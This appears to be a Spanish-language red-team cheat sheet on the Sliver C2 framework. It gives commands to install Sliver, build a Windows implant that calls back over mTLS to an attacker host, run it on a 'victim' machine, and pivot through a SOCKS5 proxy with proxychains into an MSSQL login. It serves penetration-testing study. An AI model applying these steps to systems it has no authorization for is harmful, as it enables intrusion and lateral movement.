# Sliver C2 Framework 

Tags: #C2 #Sliver #Framework #Windows 

Un **C2 (Command and Control) framework** es una plataforma utilizada en Red Teaming para controlar y administrar **implants/agents** en sistemas comprometidos desde un servidor central. Permite establecer diferentes **listeners y canales de comunicación C2** como HTTP/S, DNS, mTLS o WireGuard, administrar **beacons y sesiones interactivas**, ejecutar tareas y comandos, realizar actividades de **post-explotación**, utilizar capacidades como **SOCKS, port forwarding y pivoting**, y gestionar múltiples equipos comprometidos desde una misma infraestructura. Algunos ejemplos son **Sliver** y **PowerShell Empire**; **Starkiller** funciona como interfaz gráfica para Empire.

* [Sliver](https://sliver.sh/)

```bash 
# Instalación en Kali 
❯ curl https://sliver.sh/install | sudo bash
```

```bash 
Paso 1:
❯ sliver 
	❯ generate --mtls IP_Kali:443 --os windows --save pivot.exe

	# --mtls       = Utiliza mTLS como protocolo C2
	# 443          = Puerto utilizado para la comunicación
	# --os windows = Genera el implant para Windows
	# --save       = Guarda el implant en la ruta especificada

Paso 2:
# Transferir 'pivot.exe' a la máquina Windows víctima 

Paso 3:
# Iniciar el listener 
❯ sliver  
	❯ mtls -L IP_Kali -l 443

Paso 4:
# Ejecutar 'pivot.exe' en la máquina Windows víctima

Paso 5:
# Una vez obtenida la sesión establecida ejecutar SOCKS5
❯ sliver 
	❯ sessions             # Mirar la sesión establecida 
	❯ sessions -i <ID>     # Ingresar a la sesión esta activa 
		❯ whoami 
		❯ socks5 start     # Ejecutar SOCKS5 

NOTA:
	- El Sliver te muestra el puerto donde esucha, ejemplo 1080, ese mismo puerto colocarlo en el archivo 'proxychains4.conf'


Paso 6:
# Configurar Proxychains 
❯ sudo nano /etc/proxychains4.conf 
	socks5 127.0.0.1 1080

NOTA:
	- El puerto por defecto de Sliver SOCKS5 proxy es 1080 
```

```bash 
# Ejecutar comandos 
❯ proxychains -q impacket-mssqlclient 'domain.corp'/'user':'P@$$w0rd123!'@127.0.0.1 -windows-auth
```